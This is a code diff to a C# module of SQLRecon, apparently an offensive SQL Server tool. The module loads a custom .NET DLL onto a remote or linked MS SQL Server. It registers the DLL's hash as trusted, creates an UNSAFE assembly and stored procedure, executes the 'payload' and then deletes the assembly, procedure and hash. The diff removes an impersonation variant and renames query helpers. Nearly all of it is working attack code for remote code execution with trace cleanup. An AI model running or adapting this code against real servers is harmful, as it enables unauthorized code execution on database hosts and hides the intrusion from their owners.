@@ -15,7 +15,7 @@ namespace SQLRecon.Modules
         private static readonly SqlQuery _sqlQuery = new();
 
         /// <summary>
-        /// The Standard method loads and executes a custom .NET assembly 
+        /// The Standard method loads and executes a custom .NET assembly
         /// on a remote SQL server instance.
         /// </summary>
         /// <param name="con"></param>
@@ -103,7 +103,7 @@ namespace SQLRecon.Modules
             }
 
             /* Create a stored procedure based on the function name in the DLL.
-            * 
+            *
             * Interestingly, this query needs to be executed with 'ExecuteNonQuery'
             * as this will execute the query as a block. In MS SQL manager, this command
             * will need to be executed with a GO before it, and a GO after it a
@@ -151,157 +151,7 @@ namespace SQLRecon.Modules
         }
 
         /// <summary>
-        /// The Impersonate method loads and executes a custom .NET assembly 
-        /// on a remote SQL server instance using impersonation.
-        /// </summary>
-        /// <param name="con"></param>
-        /// <param name="dll"></param>
-        /// <param name="function"></param>
-        /// <param name="impersonate"></param>
-        public void Impersonate(SqlConnection con, string dll, string function, string impersonate = "null")
-        {
-
-            // First check to see if clr integration is enabled.
-            string sqlOutput = _config.ModuleStatus(con, "clr enabled", impersonate);
-
-            if (!sqlOutput.Contains("1"))
-            {
-                _print.Error("You need to enable CLR (ienableclr).", true);
-                // Go no futher.
-                return;
-            }
-
-            // Get the SHA-512 hash for the DLL and convert the DLL to bytes.
-            string[] dllArr = _convertDLLToSQLBytes(dll);
-            string dllHash = dllArr[0];
-            string dllBytes = dllArr[1];
-
-            if (dllHash.Length != 128)
-            {
-                _print.Error("Unable to calculate hash for DLL.", true);
-                // Go no futher.
-                return;
-            }
-
-            // Generate a new random string for the trusted hash path and the assembly name.
-            string dllPath = _rs.Generate(8);
-            string assem = _rs.Generate(8);
-
-            // Check to see if the hash already exists.
-            sqlOutput = _sqlQuery.ExecuteImpersonationQuery(con, impersonate, "SELECT * FROM sys.trusted_assemblies where hash = 0x" + dllHash + "; ");
-
-            if (sqlOutput.Contains("System.Byte[]"))
-            {
-                _print.Status("Hash already exists in sys.trusted_assemblies. Deleting it before moving forward.", true);
-                _sqlQuery.ExecuteImpersonationQuery(con, impersonate, "EXEC sp_drop_trusted_assembly 0x" + dllHash + ";");
-            }
-
-            // Add the DLL hash into the trusted_assemblies table on the SQL Server. Set a random name for the DLL hash.
-            _sqlQuery.ExecuteImpersonationQuery(con, impersonate,
-                "EXEC sp_add_trusted_assembly 0x" + dllHash + ",N'" + dllPath +
-                 ", version=0.0.0.0, culture=neutral, publickeytoken=null, processorarchitecture=msil';");
-
-            // Verify that the SHA-512 hash has been added.
-            sqlOutput = _sqlQuery.ExecuteImpersonationCustomQuery(con, impersonate,
-                "SELECT * FROM sys.trusted_assemblies;");
-
-            if (sqlOutput.Contains(dllPath))
-            {
-                _print.Success(string.Format("Added SHA-512 hash for '{0}' to sys.trusted_assemblies with a random name of '{1}'.", dll, dllPath), true);
-            }
-            else
-            {
-                _print.Error("Unable to add hash to sys.trusted_assemblies.", true);
-                // Go no further.
-                return;
-            }
-
-
-            // Drop the procedure name, which is the same as the function name if it exists already.
-            // Drop the assembly name if it exists already.
-            _sqlQuery.ExecuteImpersonationQuery(con, impersonate, "DROP PROCEDURE IF EXISTS " + function + ";");
-            _sqlQuery.ExecuteImpersonationQuery(con, impersonate, "DROP ASSEMBLY IF EXISTS " + assem + ";");
-
-            // Create a new custom assembly with the randomly generated name.
-            _print.Status(string.Format("Creating a new custom assembly with the name '{0}'.", assem), true);
-            _sqlQuery.ExecuteImpersonationQuery(con, impersonate,
-                "CREATE ASSEMBLY " + assem + " FROM 0x" + dllBytes + " WITH PERMISSION_SET = UNSAFE;");
-
-
-            // Check to see if the custom assembly has been created
-            sqlOutput = _sqlQuery.ExecuteImpersonationQuery(con, impersonate,
-                "SELECT * FROM sys.assemblies where name = '" + assem + "';");
-
-            if (sqlOutput.Contains(assem))
-            {
-                _print.Success(string.Format("Created a new custom assembly with the name '{0}' and loaded the DLL into it.", assem), true);
-            }
-            else
-            {
-                _print.Error(string.Format("Unable to create a new assembly. Cleaning up."), true);
-                _sqlQuery.ExecuteImpersonationQuery(con, impersonate, "EXEC sp_drop_trusted_assembly 0x" + dllHash + ";");
-                _sqlQuery.ExecuteImpersonationQuery(con, impersonate, "DROP ASSEMBLY IF EXISTS " + assem + ";");
-                // Go no further.
-                return;
-            }
-
-
-            /* Create a stored procedure based on the function name in the DLL.
-            * 
-            * Interestingly, this query needs to be executed with 'ExecuteNonQuery'
-            * as this will execute the query as a block. In MS SQL manager, this command
-            * will need to be executed with a GO before it, and a GO after it a
-            *'CREATE/ALTER PROCEDURE' must be the first statement in a query batch.
-            */
-            _print.Error(string.Format("Unable to create a new assembly. Cleaning up."), true);
-            try
-            {
-                SqlCommand query = new(
-                "EXECUTE AS LOGIN = '" + impersonate + "';", con);
-
-                query.ExecuteNonQuery();
-
-                query = new(
-                    "CREATE PROCEDURE [dbo].[" + function + "]" +
-                    "AS EXTERNAL NAME [" + assem + "].[StoredProcedures].[" + function + "]", con);
-                
-                query.ExecuteNonQuery();
-            }
-            catch (Exception e)
-            {
-                _print.Error(string.Format("{0}", e), true);
-            }
-
-            sqlOutput = _sqlQuery.ExecuteImpersonationCustomQuery(con, impersonate,
-                "SELECT SCHEMA_NAME(schema_id), name FROM sys.procedures WHERE type = 'PC';");
-
-            if (sqlOutput.Contains(function))
-            {
-                _print.Success(string.Format("Created '[{0}].[StoredProcedures].[{1}]'.", assem, function), true);
-            }
-            else
-            {
-                _print.Error("Unable to load DLL into custom stored procedure. Cleaning up.", true);
-                _sqlQuery.ExecuteImpersonationQuery(con, impersonate, "DROP PROCEDURE IF EXISTS " + function + ";");
-                _sqlQuery.ExecuteImpersonationQuery(con, impersonate, "DROP ASSEMBLY IF EXISTS " + assem + ";");
-                _sqlQuery.ExecuteImpersonationQuery(con, impersonate, "EXEC sp_drop_trusted_assembly 0x" + dllHash + ";");
-                // Go no futher.
-                return;
-            }
-
-            // Executing new custom assembly and stored procedure.
-            _print.Status("Executing payload ...", true);
-            _sqlQuery.ExecuteImpersonationCustomQuery(con, impersonate, "EXEC " + function);
-
-            // Cleaning up
-            _print.Status(string.Format("Cleaning up. Deleting assembly '{0}', stored procedure '{1}' and hash from sys.trusted_assembly.", assem, function), true); 
-            _sqlQuery.ExecuteImpersonationQuery(con, impersonate, "DROP PROCEDURE IF EXISTS " + function + ";");
-            _sqlQuery.ExecuteImpersonationQuery(con, impersonate, "DROP ASSEMBLY IF EXISTS " + assem + ";");
-            _sqlQuery.ExecuteImpersonationQuery(con, impersonate, "EXEC sp_drop_trusted_assembly 0x" + dllHash + ";");
-        }
-
-        /// <summary>
-        /// The Linked method loads and executes a custom .NET assembly 
+        /// The Linked method loads and executes a custom .NET assembly
         /// on a remote linked SQL server instance
         /// </summary>
         /// <param name="con"></param>
@@ -347,23 +197,23 @@ namespace SQLRecon.Modules
             string assem = _rs.Generate(8);
 
             // Check to see if the hash already exists.
-            sqlOutput = _sqlQuery.ExecuteLinkedCustomQuery(con, linkedSqlServer,
+            sqlOutput = _sqlQuery.ExecuteTunnelCustomQuery(con, linkedSqlServer,
                 "SELECT * FROM sys.trusted_assemblies where hash = 0x" + dllHash + ";");
 
             if (sqlOutput.Contains("System.Byte[]"))
             {
                 _print.Status("Hash already exists in sys.trusted_assemblies. Deleting it before moving forward.", true);
-                _sqlQuery.ExecuteLinkedCustomQueryRpcExec(con, linkedSqlServer, 
+                _sqlQuery.ExecuteTunnelCustomQueryRpcExec(con, linkedSqlServer,
                     "EXEC sp_drop_trusted_assembly 0x" + dllHash + ";");
             }
 
             // Add the DLL hash into the trusted_assemblies table on the SQL Server. Set a random name for the DLL hash.
-            _sqlQuery.ExecuteLinkedCustomQueryRpcExec(con, linkedSqlServer, 
+            _sqlQuery.ExecuteTunnelCustomQueryRpcExec(con, linkedSqlServer,
                 "EXEC sp_add_trusted_assembly 0x" + dllHash + ",N''" + dllPath +
                     ", version=0.0.0.0, culture=neutral, publickeytoken=null, processorarchitecture=msil'';");
 
             // Verify that the SHA-512 hash has been added.
-            sqlOutput = _sqlQuery.ExecuteLinkedCustomQuery(con, linkedSqlServer,
+            sqlOutput = _sqlQuery.ExecuteTunnelCustomQuery(con, linkedSqlServer,
                 "SELECT * FROM sys.trusted_assemblies;");
 
             if (sqlOutput.Contains(dllPath))
@@ -379,16 +229,16 @@ namespace SQLRecon.Modules
 
             // Drop the procedure name, which is the same as the function name if it exists already.
             // Drop the assembly name if it exists already.
-            _sqlQuery.ExecuteLinkedCustomQueryRpcExec(con, linkedSqlServer, "DROP PROCEDURE IF EXISTS " + function + ";");
-            _sqlQuery.ExecuteLinkedCustomQueryRpcExec(con, linkedSqlServer, "DROP ASSEMBLY IF EXISTS " + assem + ";");
+            _sqlQuery.ExecuteTunnelCustomQueryRpcExec(con, linkedSqlServer, "DROP PROCEDURE IF EXISTS " + function + ";");
+            _sqlQuery.ExecuteTunnelCustomQueryRpcExec(con, linkedSqlServer, "DROP ASSEMBLY IF EXISTS " + assem + ";");
 
             // Create a new custom assembly with the randomly generated name.
             _print.Status(string.Format("Creating a new custom assembly with the name '{0}'.", assem), true);
-            _sqlQuery.ExecuteLinkedCustomQueryRpcExec(con, linkedSqlServer, 
+            _sqlQuery.ExecuteTunnelCustomQueryRpcExec(con, linkedSqlServer,
                 "CREATE ASSEMBLY " + assem + " FROM 0x" + dllBytes + " WITH PERMISSION_SET = UNSAFE;");
 
             // Check to see if the custom assembly has been created
-            sqlOutput = _sqlQuery.ExecuteLinkedCustomQuery(con, linkedSqlServer,
+            sqlOutput = _sqlQuery.ExecuteTunnelCustomQuery(con, linkedSqlServer,
                 "SELECT * FROM sys.assemblies where name = ''" + assem + "'';");
 
             if (sqlOutput.Contains(assem))
@@ -398,14 +248,14 @@ namespace SQLRecon.Modules
             else
             {
                 _print.Error(string.Format("Unable to create a new assembly. Cleaning up."), true);
-                _sqlQuery.ExecuteLinkedCustomQueryRpcExec(con, linkedSqlServer, "EXEC sp_drop_trusted_assembly 0x" + dllHash + ";");
-                _sqlQuery.ExecuteLinkedCustomQueryRpcExec(con, linkedSqlServer, "DROP ASSEMBLY IF EXISTS " + assem + ";");
+                _sqlQuery.ExecuteTunnelCustomQueryRpcExec(con, linkedSqlServer, "EXEC sp_drop_trusted_assembly 0x" + dllHash + ";");
+                _sqlQuery.ExecuteTunnelCustomQueryRpcExec(con, linkedSqlServer, "DROP ASSEMBLY IF EXISTS " + assem + ";");
                 // Go no further.
                 return;
             }
 
             /* Create a stored procedure based on the function name in the DLL.
-             * 
+             *
              * Interestingly, this query needs to be executed with 'ExecuteNonQuery'
              * as this will execute the query as a block. In MS SQL manager, this command
              * will need to be executed with a GO before it, and a GO after it a
@@ -419,7 +269,7 @@ namespace SQLRecon.Modules
                     "CREATE PROCEDURE [dbo].[" + function + "]" +
                     "AS EXTERNAL NAME [" + assem + "].[StoredProcedures].[" + function + "]" +
                     "') AT " + linkedSqlServer + ";", con);
-                
+
                 query.ExecuteNonQuery();
             }
             catch (Exception e)
@@ -427,7 +277,7 @@ namespace SQLRecon.Modules
                 _print.Error(string.Format("{0}", e), true);
             }
 
-            sqlOutput = _sqlQuery.ExecuteLinkedCustomQuery(con, linkedSqlServer,
+            sqlOutput = _sqlQuery.ExecuteTunnelCustomQuery(con, linkedSqlServer,
                 "SELECT SCHEMA_NAME(schema_id), name FROM sys.procedures WHERE type = ''PC'';");
 
             if (sqlOutput.Contains(function))
@@ -437,9 +287,9 @@ namespace SQLRecon.Modules
             else
             {
                 _print.Error("Unable to load DLL into custom stored procedure. Cleaning up.", true);
-                _sqlQuery.ExecuteLinkedCustomQueryRpcExec(con, linkedSqlServer, "DROP PROCEDURE IF EXISTS " + function + ";");
-                _sqlQuery.ExecuteLinkedCustomQueryRpcExec(con, linkedSqlServer, "DROP ASSEMBLY IF EXISTS " + assem + ";");
-                _sqlQuery.ExecuteLinkedCustomQueryRpcExec(con, linkedSqlServer, "EXEC sp_drop_trusted_assembly 0x" + dllHash + ";");
+                _sqlQuery.ExecuteTunnelCustomQueryRpcExec(con, linkedSqlServer, "DROP PROCEDURE IF EXISTS " + function + ";");
+                _sqlQuery.ExecuteTunnelCustomQueryRpcExec(con, linkedSqlServer, "DROP ASSEMBLY IF EXISTS " + assem + ";");
+                _sqlQuery.ExecuteTunnelCustomQueryRpcExec(con, linkedSqlServer, "EXEC sp_drop_trusted_assembly 0x" + dllHash + ";");
                 // Go no futher.
                 return;
 
@@ -447,13 +297,13 @@ namespace SQLRecon.Modules
 
             // Cxecuting new custom assembly and stored procedure.
             _print.Status("Executing payload ...", true);
-            _sqlQuery.ExecuteLinkedCustomQueryRpcExec(con, linkedSqlServer, "EXEC " + function);
+            _sqlQuery.ExecuteTunnelCustomQueryRpcExec(con, linkedSqlServer, "EXEC " + function);
 
             // Cleaning up.
             _print.Status(string.Format("Cleaning up. Deleting assembly '{0}', stored procedure '{1}' and hash from sys.trusted_assembly.", assem, function), true);
-            _sqlQuery.ExecuteLinkedCustomQueryRpcExec(con, linkedSqlServer, "DROP PROCEDURE IF EXISTS " + function + ";");
-            _sqlQuery.ExecuteLinkedCustomQueryRpcExec(con, linkedSqlServer, "DROP ASSEMBLY IF EXISTS " + assem + ";");
-            _sqlQuery.ExecuteLinkedCustomQueryRpcExec(con, linkedSqlServer, "EXEC sp_drop_trusted_assembly 0x" + dllHash + ";");
+            _sqlQuery.ExecuteTunnelCustomQueryRpcExec(con, linkedSqlServer, "DROP PROCEDURE IF EXISTS " + function + ";");
+            _sqlQuery.ExecuteTunnelCustomQueryRpcExec(con, linkedSqlServer, "DROP ASSEMBLY IF EXISTS " + assem + ";");
+            _sqlQuery.ExecuteTunnelCustomQueryRpcExec(con, linkedSqlServer, "EXEC sp_drop_trusted_assembly 0x" + dllHash + ";");
         }
 
         /// <summary>
